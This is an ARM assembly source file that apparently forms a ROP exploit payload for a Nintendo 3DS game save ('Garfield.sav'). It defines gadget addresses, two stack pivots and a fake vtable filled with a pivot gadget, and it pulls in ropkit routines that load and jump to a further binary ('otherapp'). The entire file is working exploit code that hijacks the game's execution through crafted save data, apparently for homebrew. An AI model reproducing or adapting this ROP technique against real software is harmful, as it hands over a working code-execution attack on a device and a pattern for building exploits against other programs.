	.arm
	.text
	
#include "lasagna_us.h"

#define GARBAGE 0xdeadb0b0
#define STACK_PIVOT 0x001451e4  //: cmp r0, r1 ; moveq r0, #1 ; beq #0x45204 ; mov r0, #0 ; bx lr
#define STACK_PIVOT2 0x001007bc //: ldmdb r6, {r0, r2, r5, r6, ip, sp, lr, pc} 

#define ROPBUF 0x002312e0    //bss location of rop payload (ropkit_boototherapp.s) that launches otherapp
#define ROPKIT_LINEARMEM_REGIONBASE 0x14000000
#define ROPKIT_LINEARMEM_BUF (ROPKIT_LINEARMEM_REGIONBASE+0x1300000)

#define ROPKIT_MOUNTSAVEDATA
#define ROPKIT_BINPAYLOAD_PATH "data:/Garfield.sav"
#define ROPKIT_TMPDATA 0x0FFFc000
#define ROPKIT_BINLOAD_TEXTOFFSET 0x90000
#define ROPKIT_ENABLETERMINATE_GSPTHREAD
#define ROPKIT_BEFOREJUMP_CACHEBUFADDR 0x15400000
#define ROPKIT_BEFOREJUMP_CACHEBUFSIZE 0x100000  //large gsgpu flush fixes our new3ds L2 cache issues - and increases stability for old3ds


#include "ropkit_ropinclude.s"

_start:
ropstackstart:

#include "ropkit_boototherapp.s"  

.word 4
.word 8
.word 12
pivot_regstore:
.word 16
.word 20
.word 24

ropkit_cmpobject:
.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
.fill (0x40 / 4), 4, STACK_PIVOT2 @ Vtable